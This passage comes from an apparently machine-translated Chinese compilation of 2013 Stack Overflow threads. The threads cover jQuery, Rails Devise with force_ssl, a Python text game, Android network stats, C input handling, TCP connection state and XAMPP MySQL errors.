> 赞同：1
> 
> 时间：2013-03-01T17:51:40.867

我不知道，但我的代码运行良好：

```
$(window).resize(function(){
   if($('#header').width() < 1270){
       alert('teste');
   }
}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:52:39.650

由于您显然在使用 jQuery：

```
$("#header").width() 
```

将返回标题元素的宽度

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-01T17:39:47.940

看到那个话题

[jQuery中元素的总宽度（包括填充和边框）](https://stackoverflow.com/questions/349705/total-width-of-element-including-padding-and-border-in-jquery)

有一个解释来获取元素宽度和其他属性

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-01T17:54:41.483

要获得精确的 Div 宽度，可以使用 getBoundingClientRect() 并从 Left 中减去 Right。

# devise - 使用 force_ssl 时设计重定向到不同的资源

> ID：15163533
> 
> 赞同：3
> 
> 时间：2013-03-01T17:33:04.367
> 
> 标签：devise, ruby-on-rails-3.2

我已经`force_ssl`为我的整个应用程序启用了，并且正在使用 Devise 进行身份验证。但是，在生产中，当我尝试访问 http 设计路径（`http://domain.com/users/sign_in`例如`https://domain.com/admins/sign_in`.

这似乎取决于资源在 routes.rb 中给出的顺序。例如，如果我有：

```
devise_for :users
devise_for :admins 
```

然后访问`http://domain.com/admins/sign_in`将重定向到`https://domain.com/users/sign_in`，而`http://domain.com/users/sign_in`将保持正确的资源并重定向到`https://domain.com/users/sign_in`。

如果我更改 routes.rb 中资源的顺序，则相反。

我已经`force_ssl`在我的应用程序控制器中实现了一个非常略微定制的版本，以便以后能够将一些控制器操作指定为异常。

```
class ApplicationController < ActionController::Base
include ApplicationHelper
protect_from_forgery

#Re-implement force_ssl to allow override in controllers
def self.force_ssl(options = {})
 host = options.delete(:host)
 before_filter(options) do
  if !request.ssl? && !Rails.env.development? && !(respond_to?(:allow_http?) && allow_http?)
    redirect_options = {:protocol => 'https://', :status => :moved_permanently}
    redirect_options.merge!(:host => host) if host
    redirect_options.merge!(:params => request.query_parameters)
    redirect_to redirect_options
  end
 end
end

force_ssl
end 
```

如何确保设计资源在从 http 到 https 的重定向中得到维护？

谢谢

# python - Python 选择文本游戏的问题（if-then 语句无法正常工作）

> ID：15163540
> 
> 赞同：1
> 
> 时间：2013-03-01T17:33:13.740
> 
> 标签：python, if-statement

我正在尝试在 Python 3.2.3 中制作一个非常简单的游戏，我从我创建的选项中输入一个字符串字符并返回一个结果。在我得到结果后，它将要么循环回到主菜单功能以做出另一个选择，要么一个选项将结束程序。

当我创建这个游戏时，我可以在输入时弹出一个选择，但它总是显示前两个选项，而不是我输入的那个。

我的选择结果是加法运算符和打印文本的混合。我不知道这是否有帮助，但我将粘贴下面的代码。

谁能告诉我我做错了什么？我认为这是我的 if-then-else 语句，因为无论我在该函数中移动什么，它总是显示相同的输出。但任何提示都会有所帮助。

* * *

## 编辑：

如果我输入整个代码可能是最好的，因为我现在得到了

> NameError：未定义全局名称“xString”

另外：set_sword()、set_rock() 也都设置为函数。当用户键入“sword”时应该调用它们并且它应该调用 get_sword 函数（它会这样做，但随后它也会调用 set_magic() 函数。

这是编辑后的代码：

```
# ADDITIONAL DETAILS

# This code calculates the damage you would do if you were a heroic knight that is attacking an evil dragon.
# You have 6 options available in the main menu: Attack with your sword, attack with magic, block with your shield, Throw a rock at it, Run away, and Quit fight (or exit).
# The calculations involve subtracting the attack damage numbers against the dragons HP (or Health Points). For example, if your attack with sword number subtracts the dragons HP number and reaches 0: the dragon will be defeated and the game is “won’.
# When the game is won the game is reset back to the main menu (in this case the main menu are the fighting options.)
# I hope you find this particular project entry unique and fun!
# Main menu function. It should present the options available to input, allow the input of the listed options and be looped until the user uses the quit command.
def set_main():
        sword = set_sword()
        magic = set_magic()
        block = set_block()
        rock = set_rock()
        run = set_run()
        done = set_finish()
        print("Main Menu: ")
        print("Only one of your attacks can lower his HP to zero! What will you do?! ")
        print("Type “sword” to use a sword attack with an attack power of 60! ")
        print("Type “magic” to use a magic attack with an attack power of 80!")
        print("Type “block” to block with your shield with an attack power of 70! ")
        print("Type “rock” to throw a rock! with an attack power of ??? ")
        print("Type “run” to RUN AWAY DUDE! It has an attack power of only 1 though. ")
        print("Type “done” to finish the game and program. ")

# sword attack function that should be called if the input is "sword"
def set_sword():
        sword = str(xString)
        sword = 60
        dragon = 100
        print('The sum of ', sword, ' and ', dragon, ' is ', sword-dragon, ' Attack power! ', sep='')
        print("Your Super Special Overlasting Justice Power Sword attack did little damage!")
        print("The dragon grabs you and eats you whole! Gross.")
        print("Try Again!")
        return set_sword

# magic attack function that should be called if the input is "magic"
def set_magic():
        magic = str(xString)
        magic = 80
        dragon = 100
        print('The sum of ', magic, ' and ', dragon, ' is ', magic-dragon, ' Attack power! ', sep='')
        print("Your magic attack is too weak!")
        print("The dragon uses it's mighty feet and stomps on you!")
        print("So yeah, you're dead. Try again!")
        return set_magic

# blocking attack function that should be called if the input is "block"
def set_block():
        block = str(xString)
        block = 100
        dragon = 100
        print('The sum of ', block, ' and ', dragon, ' is ', block-dragon, ' Attack power! ', sep='')
        print("You blocked the dragon's attack perfectly!")
        print("Both you and the dragon are exhasuted and decide to fight another day!")
        print("So uh...Try again tomorrow?")
        return set_block

# rock throw attack function that should be called if the input is "rock"
def set_rock():
        rock = str(xString)
        rock = 150
        dragon = 100
        print('The sum of ', rock, ' and ', dragon, ' is ', rock-dragon, ' Attack power! ', sep='')
        print("In complete desperation you find a rock next to you and throw it at the dragon!")
        print("The rock hits the drgon square in the eye! It roars in pain!")
        print("The dragon then begins to cry and it doesn't like things hitting his eye.")
        print("The dragon then flies away from the castle in fear!")
        print("So..YOU DID IT! Congratulations! Try one of the other options!")
        return set_rock

# run command function that should be called if input is "run"
def set_run():
        run = str(xString)
        run = 150
        dragon = 100
        print('The sum of ', run, ' and ', dragon, ' is ', run-dragon, ' Attack power! ', sep='')
        print("You decide that saving the world isn't worth it and you run!")
        print("You decide to retire and leave a peaceful life. You find a nice partner, fall in love, and have children.")
        print("several years later the dragon storms into your village and wipes out everything!")
        print("Including you...")
        print("Was your time of peace worth it? Find out by trying again!")
        return set_run

# quit function that should quit the program if the user inputs "done"
def set_finish():
        print("Game over! Thanks for playing!")
        quit
        return set_finish

# default introduction print should explain the game and pretends an ending input.
print("The hero arrives in the dark castle and is welcomed by a large and evil dragon! You are that hero and must defeat the dragon to save the princess!")
print("The Dragon has 100 HP! ")
xString = str(input("What attack will you do?! (Type the attack name to pick an attack) :"))
if xString == "sword":
        print(set_sword())
elif xString == "magic":
        print(set_magic())
elif xString == "block":
        print(set_block())
elif xString == "rock":
        print(set_rock())
elif xString == "run":
        print(set_run())
elif xString == "done":
        print(set_finish())
else:
        print("Pick an option please.")
        quit
print(set_main())
print("Hope you had fun!") 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:48:37.740

您遇到了一些问题，其中最重要的是您正在比较变量和字符串。引号计数。而且我认为你还不了解道文。输入语句之后的两个赋值语句都不需要存在：

```
xString = input("What attack will you do?! (Type the attack name to pick an attack) :")
# xString = 0
# xString = str(xString) 
```

如果要确保输入是字符串，请执行以下操作：

```
xString = str(input("What attack will you do?! (Type the attack name to pick an attack) :"))
# xString = 0
# xString = str(xString) 
```

在您的 if...elif 中，您可以在不需要时定义变量。

```
# sword = set_sword()
# magic = set_magic()
# block = set_block()
# rock = set_rock()
# run = set_run()
# done = set_finish()

if xString == "sword":
        xString = 60 # I hope you know why you changed the value of xString
        print(set_sword())

elif xString == "magic":
        print(set_magic())

elif xString == "block":
        print(set_block())

elif xString == "rock":
        print(set_rock())

elif xString == "run":
        print(set_run())

elif xString == "done":
        print(set_finish())

else:
        print("Pick an option please.")
        quit 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:47:56.763

```
xString = input("What attack will you do?! (Type the attack name to pick an attack) :")
xString = 0
xString = str(xString) 
```

`xString`执行这 3 条语句后的值将*始终*为`'0'`. 我不明白你为什么有第二和第三个作业——你可能应该把它们删掉。

***编辑：***

```
# This line reads the user input, which is probably what you want.
xString = input("What attack will you do?! (Type the attack name to pick an attack) :")
# This line throws away the user input in xString by assigning 0 instead
xString = 0
# Since xString = 0, this is the same as xString = str(0), which returns '0'
xString = str(xString) 
```

***更新：***

我之前假设`sword = set_sword()`是返回一个字符串，但是现在您已经发布了完整的代码，看起来它正在返回一个函数句柄。您应该遵循 James 的建议，以便将输入与字符串而不是函数进行比较。代码还有很多其他问题（例如，您在做什么`quit`？），因此您仍然需要解决一些其他问题。

# javascript - 根据存在的变量将多个选择器分配给变量

> ID：15163541
> 
> 赞同：1
> 
> 时间：2013-03-01T17:33:14.950
> 
> 标签：javascript, jquery, variables

我正在遍历一个容器并寻找可能存在的元素。如果其中一个元素存在，我想将该元素的 jQuery 对象分配给一个变量。我有一个解决方案，但我不确定这是否是一个好方法。

**HTML**

```
<form>
<div>
    <label>First name</label>
    <input type="text"/>
</div>

<div>
    <label>last name</label>
    <input type="text"/>
</div>

<div>
    <label>location</label>
    <select>
        <option>USA</option>
    </select>
</div>
</form> 
```

**JS**

```
$(document).ready(function(){
var testNum = $('form').find('label').length;
for(var i=0; i<testNum; i++) {
    var currentTest = $('form').find('label').eq(i).parent().find('input').length ? $('form').find('label').eq(i) : false || $('form').find('label').eq(i).parent().find('select').length ? $('form').find('label').eq(i) : false;
    $('html').append(currentTest.text() + '<br/>');
}
}); 
```

**编辑：更新的小提琴和问题**

[http://jsfiddle.net/PMtZB/1/](http://jsfiddle.net/PMtZB/1/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:45:46.333

您循环的方式效率低下。您应该使用该`.each()`方法，如下所示：

```
$('form').find('label').each(function() {
    var $label = $(this); // $label is a jQuery object that refers to the label element.

    ...
}); 
```

你这样做的方式是重复调用`.find()`同一个选择器。

**编辑问题后的更新：**

先说两点：

1.  如果你用文字而不是代码来说明你想要的元素，那将会很有帮助。我假设您想要所有`<label>`后跟 an`<input>`或 a 的元素`<select>`。
2.  你应该使用括号。我查了一下，逻辑或运算符的优先级高于条件运算符，条件运算符具有从右到左的关联性。我认为您需要添加括号，以便您的语句如下所示`(c1 ? a1 : a2) || (c2 ? b1 : b2)`：没有括号，你有`c1 ? a1 : ((a2 || c2) ? b1 : b2)`.

您可以尝试添加 KD 建议并连接 jQuery 包装集：

```
$(document).ready(function() {

    var $matchingLabels = $();

    $('form').find('label').each(function() {
        var $label = $(this);
        if ($label.next().is('input, select')) {
            $matchingLabels.add($label);
        }
    });

    // At this point $matchingLabels holds the labels you want.
}); 
```

您也可以尝试使用“prev + next”选择器：

```
$(document).ready(function() {

    var $matchingLabels = $('form').find('label + input, label + select').prev();

}); 
```

当然，如果你不能假设`<input>`and`<select>`元素总是紧跟在`<label>`元素后面，你将不得不使用第一个选项并修改 if 语句。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:39:20.127

```
$(document).ready(function(){
    var testNum = $('form').find('label').length;

    $('form').find('label').each(function(){
        if($(this).next().is("input") || $(this).next().is("select"))
        {
           $('html').append($(this).text() + '<br/>');
        }
    });

}); 
```

**将此代码粘贴到您的小提琴中并测试..**

# java - android API 级别 <16 中的 NSD 等效项

> ID：15163544
> 
> 赞同：2
> 
> 时间：2013-03-01T17:33:37.727
> 
> 标签：java, android, api, networking

正如我们大多数人所知，android `NSD`（网络服务发现）框架使本地网络中的网络变得非常简单和容易。`NSD implementation`然而，从 API 级别 16 (Jelly Bean) 开始的 android API 。我关心局域网而不是互联网

*那么在较低的 API 级别（ Gingerbread 和 ICS* ）有没有像 NSD 这样的简单方法。更清楚地说，在应用程序中实现网络服务的最佳方式是什么`API level <16`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-05T10:23:28.177

尝试使用 JmDNS Java 库。

[JmDNS 库](http://jmdns.sourceforge.net/)

[在 Android 中使用的教程](http://home.heeere.com/tech-androidjmdns.html)

# colors - 设置JFree Chart图例边框颜色

> ID：15163545
> 
> 赞同：3
> 
> 时间：2013-03-01T17:33:37.727
> 
> 标签：colors, jfreechart, legend

问题在标题中提出。细节：

我在类主题中有代码，用于为图例框架的边框设置特定的非默认颜色。

```
LegendTitle legend = jFreeChart.getLegend();
legend.setWidth(100); 
```

在此之后我需要为图例的边框设置颜色，但没有像

```
legend.setBorderColor(Color.green) 
```

我找不到。

请帮帮我。

感谢您的回复。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-02T01:31:47.200

您可以在替换图例的边框时指定新颜色：

```
LegendTitle legend = chart.getLegend();
legend.setFrame(new BlockBorder(Color.green)); 
```

![在此处输入图像描述](../Images/44505b60423fc84ff1f180ea136271cc.png)

# android - 解读 Android xt_qtaguid/stats

> ID：15163549
> 
> 赞同：5
> 
> 时间：2013-03-01T17:33:49.240
> 
> 标签：android, cmd, adb, netstat

我有一个关于 Android 的 netstats 及其报告方式的快速问题。

通过在 cmd 中运行此代码：`adb shell cat proc/net/xt_qtaguid/stats > C:\netstats.txt"`

我得到一个看起来或多或少像这样的文件（为了提问，我截取了片段）：

```
idx iface acct_tag_hex uid_tag_int cnt_set rx_bytes rx_packets tx_bytes tx_packets rx_tcp_bytes rx_tcp_packets rx_udp_bytes rx_udp_packets rx_other_bytes rx_other_packets tx_tcp_bytes tx_tcp_packets tx_udp_bytes tx_udp_packets tx_other_bytes tx_other_packets  
44 wlan0 0x0 10123 0 45148 186 32150 265 45148 186 0 0 0 0 32150 265 0 0 0 0
45 wlan0 0x0 10123 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
46 wlan0 0x0 10138 0 19775 84 13625 129 19775 84 0 0 0 0 13625 129 0 0 0 0
47 wlan0 0x0 10138 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
48 wlan0 0x0 10142 0 36422 67 43115 105 36070 64 352 3 0 0 42467 96 648 9 0 0
49 wlan0 0x0 10142 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
50 wlan0 0x300000000 10123 0 7765 35 4820 44 7765 35 0 0 0 0 4820 44 0 0 0 0
51 wlan0 0x300000000 10123 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
52 wlan0 0x3f500000000 10096 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
53 wlan0 0x3f500000000 10096 1 2937868 2025 32034 747 2937868 2025 0 0 0 0 32034 747 0 0 0 
54 wlan0 0xdc4e7700000000 10022 0 31623 75 18611 106 31623 75 0 0 0 0 18611 106 0 0 0 0
55 wlan0 0xdc4e7700000000 10022 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
56 wlan0 0x1000000100000000 10123 0 21864 116 18225 145 21864 116 0 0 0 0 18225 145 0 0 0 0
57 wlan0 0x1000000100000000 10123 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
61 wlan0 0x1010000000000000 10045 1 33010 109 27695 113 33010 109 0 0 0 0 27695 113 0 0 0 0
62 wlan0 0x1100000000000000 10046 0 6804 14 2064 19 6804 14 0 0 0 0 2064 19 0 0 0 0
63 wlan0 0x1100000000000000 10046 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
64 wlan0 0x1144000400000000 10022 0 2532 5 1860 6 2532 5 0 0 0 0 1860 6 0 0 0 0
65 wlan0 0x1144000400000000 10022 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
66 wlan0 0x1244000400000000 10022 0 8197 14 3134 20 8197 14 0 0 0 0 3134 20 0 0 0 0
67 wlan0 0x1244000400000000 10022 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
68 wlan0 0xffffff0100000000 10045 0 8566814 6535 159315 2688 8566814 6535 0 0 0 0 159315 2688 0 0 0 0
69 wlan0 0xffffff0100000000 10045 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
```

我知道它被`UID's`（10123,10138,10142 等）分解，但我不知道是什么`cnt_set`（为什么每个都`UID`被分解为 0 或 1）以及是什么`acct_tag_hex`（我唯一的猜测是它表示不同的线程或套接字）？

如果有人能给我一些关于这两件事意味着什么的基本见解，我将不胜感激。

谢谢-Z

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-01T22:02:47.820

`acct_tag_hex`是一个套接字标签

带有`cnt_set==0`are 的行用于背景数据

带有`cnt_set==1`are 的行用于前景数据

总流量是两者的总和

# python - 从自定义 Autobahn WampClientProtocol 外部调用发布

> ID：15163550
> 
> 赞同：1
> 
> 时间：2013-03-01T17:33:50.813
> 
> 标签：python, twisted, autobahn

如何从协议类外部调用高速公路/wamp/twisted 协议发布方法？

我有一个基于[https://github.com/tavendo/AutobahnPython/blob/master/examples/wamp/pubsub/custom/client.py](https://github.com/tavendo/AutobahnPython/blob/master/examples/wamp/pubsub/custom/client.py)的自定义 python 高速公路客户端。我正在尝试从自定义 WampClientProtocol 类之外发布一个事件，但遇到了麻烦。如果我将 protcol 对象分配给一个变量，wamp.py 的第 1387 行（[https://github.com/tavendo/AutobahnPython/blob/master/autobahn/autobahn/wamp.py](https://github.com/tavendo/AutobahnPython/blob/master/autobahn/autobahn/wamp.py)）将失败，并出现异常“MyClientProtocol 实例没有属性工厂”。如果我尝试调用工厂（即“factory.protocol.publish(msg)”），则会收到发布方法未绑定的错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T23:19:36.347

以防万一有人偶然发现这个问题：高速公路邮件列表中讨论了解决方案，工作代码可以在这里找到：[https ://github.com/oberstet/scratchbox/tree/master/python/gephi](https://github.com/oberstet/scratchbox/tree/master/python/gephi)

# c - C - 是/否提示多次执行

> ID：15163555
> 
> 赞同：1
> 
> 时间：2013-03-01T17:34:03.493
> 
> 标签：c, prompt

我正在研究处理覆盖目录中文件的程序的一部分。覆盖文件很容易......但显然不会提示用户是否希望覆盖文件。例如：如果我想覆盖两个文件（fileOne.txt、fileTwo.txt），我需要提示用户两次（每个文件一次）。在我当前的提示下，如果我提示用户覆盖 fileOne.txt，fileOne.txt 和 fileTwo.txt 都将被覆盖。如果有两个以上的文件要覆盖，它将只覆盖两个连续的文件。我相信这与点击“Enter”有关，但我不知道......

```
if(((int)getHeader.deleted - 48) == 0) {
        if(access(getHeader.file_name, F_OK) != -1) { /* File exists in directory, check for overwrite */
            printf("%s already exists. Would you like to overwrite it? (y/n)\n", getHeader.file_name);
            scanf("%c", buffer);
            while(!validResponse) {
                if(buffer[0] == 'y' || buffer[0] == 'Y') {
                    validResponse = 1;
                    printf("DO SOMETHING - Files will be overwritten\n");
                } else if(buffer[0] == 'n' || buffer[0] == 'N') {
                    validResponse = 1;
                    printf("DO SOMETHING - File will be skipped\n");
                } else {
                    printf("Invalid response... Would you like to overwrite %s? (y/n)\n", getHeader.file_name);
                    scanf("%c", buffer);
                } /* End if else */
            } /* End while */
        } /* End if */
    } /* End if */ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:44:48.343

当您阅读单个字符时，您会在其中留下一个换行符，`stdin`您需要使用它：

```
scanf("%c", buffer);
getchar();  // consume the leftover '\n' 
```

会这样做，或者只是单行：

```
scanf(" %c", buffer); // the space will tell it to skip any "white space" characters 
```

仅使用您在此处的代码片段，如果在第一个提示符处输入了无效字符，它似乎会被`else`'s scanf 跳过（实际上它正在读取第一个 leftover `'\n'`）并且它将再次循环以获取输入。

在没有看到其余代码的情况下，大概您将所有这些都放在一个循环中，这就是它在 2 秒内跳过文件的原因。( `'Y'`, 那么`'\n'`)

# c++ - 闭源库 - 字节序 - 反序列化时负 -1 被读取为 0

> ID：15163556
> 
> 赞同：0
> 
> 时间：2013-03-01T17:34:07.837
> 
> 标签：c++, floating-point, deserialization, endianness

我正在从二进制 xml 中读取一些浮点数，并将它们分解为一个包含 4 个浮点数的结构（准确地说是 32 位浮点数）。所有值都可以正确读取，但那些为-1 的值除外。

*这是与字节序相关的问题吗？*

`-1`如果转换为`0`并且*所有*其他值都正确反序列化，我应该寻找什么？（我的意思是，是否有一个明显的、常见的错误或我应该考虑的错误来源？）。我无权访问执行此操作的库，也无法向您提供任何详细信息，因为它是机密的。

在这个问题真正结束之前，我想发布一个小提示（由于 NDA 条件苛刻，没有代码）：

*   我正在使用的库将一些二进制数据从 xml 转换为其特定类型
*   它以一种非常丑陋的方式做到这一点：

    值 = *(T* )srcBuffer;

    交换字节（值）；

*   `-1`因此直接读取并假定为 BigEndian 格式。不幸的是，在 BigEndian 格式中，`-1`数量`somethingE-47`确实是一个非常小的数字。汇编指令执行一些量化*并将*其舍入为零。因此，对于这种奇怪的情况，不可告人的`SwapByte`指令将获得错误的数据并失败。这是一个与 IBM/PowerPC 处理器相关的架构问题。

会`memcpy`更好地工作并避免丑陋的量化伪影吗？我不能在转换之前进行交换字节，因为我肯定会恶化其他部分。

# .net - .NET TCPClient 连接状态

> ID：15163560
> 
> 赞同：1
> 
> 时间：2013-03-01T17:34:21.213
> 
> 标签：.net, sockets, networking, tcp, tcpclient

## 背景

    我正在通过 TCP 连接与服务器（当然，我无法触摸）进行通信。我要连接的应用程序需要两个连接。一个作为“我想连接”，握手类型的东西，第二个，在不同的端口上，用于实际连接。经过几天的努力，我发现要接受第二个连接，第一个断开连接 (FIN) 必须由服务器启动（它会立即执行）。如果客户端发起断开连接，第二次连接将被拒绝。

## 问题：

    我已经阅读了很多关于此的帖子，并且我知道 TCP 连接以及您如何无法真正知道连接是否处于活动状态以及所有这些（请不要以断开连接、断线、意外关闭等响应）。但是有什么方法可以检测到远程服务器已*正确*断开连接而不尝试向其写入数据。

    再说一次，我不是在谈论掉线、断线等等。我想知道服务器何时发送我已确认的 FIN 段。听起来很简单，对吧？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T13:03:25.760

如果我正确理解了[NetworkStream](http://msdn.microsoft.com/en-us/library/z2xae4f4%28v=vs.80%29.aspx)文档。当您从 NetworkStream 读取（同步或异步）时，它返回 0 字节，这意味着远程方已关闭连接。即，FIN 已被确认。

# mysql - XAMPP 设置 - MySQL 不工作

> ID：15163563
> 
> 赞同：0
> 
> 时间：2013-03-01T17:34:32.320
> 
> 标签：mysql, windows, xampp

我正在尝试让 XAMPP 在 Win7/64 上运行以测试 Wordpress 主题。

我最初在 Apache 尝试访问端口 80 时遇到问题，但我被告知将配置文件更改为我已经完成的端口 81，现在 Apache 正在运行并且 localhost:81 显示 XAMPP 控制面板正常。

但是，现在 MySQL 根本不工作。在我更改配置文件之前，我认为是，但 Apache 没有运行，所以我仍然无法访问 localhost。

在 Windows 事件查看器中，我收到了有关 MySQL 的错误报告：

```
Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2) 
```

在 XAMPP 的控制台中，我目前得到这个：

```
17:07:36  [main]    Initializing Control Panel
17:07:36  [main]    Windows Version: Windows 7 Ultimate SP1 64-bit
17:07:36  [main]    XAMPP Version: 1.8.1
17:07:36  [main]    Control Panel Version: 3.1.0 3.1.0 [ Compiled: September 20th 2012 ]
17:07:36  [main]    Running with Administrator rights - good!
17:07:36  [main]    XAMPP Installation Directory: "c:\xampp\"
17:07:37  [main]    Checking for prerequisites
17:07:37  [main]    All prerequisites found
17:07:37  [main]    Initializing Modules
17:07:37  [Apache]  Problem detected!
17:07:37  [Apache]  Port 80 in use by "system"!
17:07:37  [Apache]  Apache WILL NOT start without the configured ports free!
17:07:37  [Apache]  You need to uninstall/disable/reconfigure the  blocking application
 17:07:37  [Apache]     or reconfigure Apache to listen on a different port
17:07:37  [Apache]  XAMPP Apache is already running on port 443
17:07:37  [main]    Starting Check-Timer
17:07:37  [main]    Control Panel Ready
17:07:40  [mysql]   Attempting to start MySQL app...
17:07:40  [mysql]   Status change detected: running
17:07:41  [mysql]   Status change detected: stopped
17:07:41  [mysql]   Error: MySQL shutdown unexpectedly.
17:07:41  [mysql]   This may be due to a blocked port, missing dependencies, 
17:07:41  [mysql]   improper privileges, a crash, or a shutdown by another method.
17:07:41  [mysql]   Check the "/xampp/mysql/data/mysql_error.log" file
17:07:41  [mysql]   and the Windows Event Viewer for more clues
17:07:47  [mysql]   Attempting to start MySQL app... 
```

这是 MySQL 的错误日志：

```
130301 16:28:14 [Note] Plugin 'FEDERATED' is disabled.
InnoDB: The InnoDB memory heap is disabled
InnoDB: Mutexes and rw_locks use Windows interlocked functions
InnoDB: Compressed tables use zlib 1.2.3
130301 16:28:14  InnoDB: Initializing buffer pool, size = 16.0M
130301 16:28:14  InnoDB: Completed initialization of buffer pool
130301 16:28:14  InnoDB: highest supported file format is Barracuda.
130301 16:28:15  InnoDB: 1.1.4 started; log sequence number 1595675
130301 16:28:15 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
130301 16:28:43 [Note] Plugin 'FEDERATED' is disabled.
InnoDB: The InnoDB memory heap is disabled
InnoDB: Mutexes and rw_locks use Windows interlocked functions
InnoDB: Compressed tables use zlib 1.2.3
130301 16:28:43  InnoDB: Initializing buffer pool, size = 16.0M
130301 16:28:43  InnoDB: Completed initialization of buffer pool
130301 16:28:43  InnoDB: highest supported file format is Barracuda.
130301 16:28:43  InnoDB: 1.1.4 started; log sequence number 1595675
130301 16:28:43 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
130301 16:28:51 [Note] Plugin 'FEDERATED' is disabled.
InnoDB: The InnoDB memory heap is disabled
InnoDB: Mutexes and rw_locks use Windows interlocked functions
InnoDB: Compressed tables use zlib 1.2.3   
130301 16:28:51  InnoDB: Initializing buffer pool, size = 16.0M
130301 16:28:51  InnoDB: Completed initialization of buffer pool
130301 16:28:51  InnoDB: highest supported file format is Barracuda.
130301 16:28:52  InnoDB: 1.1.4 started; log sequence number 1595675
130301 16:28:52 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
130301 16:30:07 [Note] Plugin 'FEDERATED' is disabled.
InnoDB: The InnoDB memory heap is disabled
 InnoDB: Mutexes and rw_locks use Windows interlocked functions
 InnoDB: Compressed tables use zlib 1.2.3
 130301 16:30:07  InnoDB: Initializing buffer pool, size = 16.0M
130301 16:30:07  InnoDB: Completed initialization of buffer pool
130301 16:30:07  InnoDB: highest supported file format is    Barracuda.
130301 16:30:07  InnoDB: 1.1.4 started; log sequence number 1595675
130301 16:30:07 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
130301 16:30:35 [Note] Plugin 'FEDERATED' is disabled.
InnoDB: The InnoDB memory heap is disabled
InnoDB: Mutexes and rw_locks use Windows interlocked functions
InnoDB: Compressed tables use zlib 1.2.3
130301 16:30:35  InnoDB: Initializing buffer pool, size = 16.0M
130301 16:30:35  InnoDB: Completed initialization of buffer pool
130301 16:30:35  InnoDB: highest supported file format is Barracuda.
130301 16:30:35  InnoDB: 1.1.4 started; log sequence number 1595675
130301 16:30:35 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
130301 16:30:43 [Note] Plugin 'FEDERATED' is disabled.
InnoDB: The InnoDB memory heap is disabled
InnoDB: Mutexes and rw_locks use Windows interlocked functions
InnoDB: Compressed tables use zlib 1.2.3
130301 16:30:43  InnoDB: Initializing buffer pool, size = 16.0M
130301 16:30:43  InnoDB: Completed initialization of buffer pool
130301 16:30:43  InnoDB: highest supported file format is Barracuda.
130301 16:30:43  InnoDB: 1.1.4 started; log sequence number 1595675
 130301 16:30:43 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
130301 16:30:56 [Note] Plugin 'FEDERATED' is disabled.
 InnoDB: The InnoDB memory heap is disabled
InnoDB: Mutexes and rw_locks use Windows interlocked functions
InnoDB: Compressed tables use zlib 1.2.3
 130301 16:30:56  InnoDB: Initializing buffer pool, size = 16.0M
130301 16:30:56  InnoDB: Completed initialization of buffer pool
130301 16:30:56  InnoDB: highest supported file format is Barracuda.
130301 16:30:57  InnoDB: 1.1.4 started; log sequence number 1595675
130301 16:30:57 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
130301 16:30:59 [Note] Plugin 'FEDERATED' is disabled.
 InnoDB: The InnoDB memory heap is disabled
 InnoDB: Mutexes and rw_locks use Windows interlocked functions
InnoDB: Compressed tables use zlib 1.2.3
130301 16:30:59  InnoDB: Initializing buffer pool, size = 16.0M
130301 16:30:59  InnoDB: Completed initialization of buffer pool
130301 16:30:59  InnoDB: highest supported file format is Barracuda.
 130301 16:30:59  InnoDB: 1.1.4 started; log sequence number     1595675
  130301 16:30:59 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
 130301 16:31:00 [Note] Plugin 'FEDERATED' is disabled.
InnoDB: The InnoDB memory heap is disabled
InnoDB: Mutexes and rw_locks use Windows interlocked functions
InnoDB: Compressed tables use zlib 1.2.3
130301 16:31:00  InnoDB: Initializing buffer pool, size = 16.0M
130301 16:31:00  InnoDB: Completed initialization of buffer pool
 130301 16:31:00  InnoDB: highest supported file format is Barracuda.
130301 16:31:01  InnoDB: 1.1.4 started; log sequence number 1595675
 130301 16:31:01 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
 130301 16:31:02 [Note] Plugin 'FEDERATED' is disabled.
InnoDB: The InnoDB memory heap is disabled
 InnoDB: Mutexes and rw_locks use Windows interlocked functions
 InnoDB: Compressed tables use zlib 1.2.3
 130301 16:31:02  InnoDB: Initializing buffer pool, size = 16.0M
 130301 16:31:02  InnoDB: Completed initialization of buffer pool
 130301 16:31:02  InnoDB: highest supported file format is Barracuda.
 130301 16:31:02  InnoDB: 1.1.4 started; log sequence number      1595675
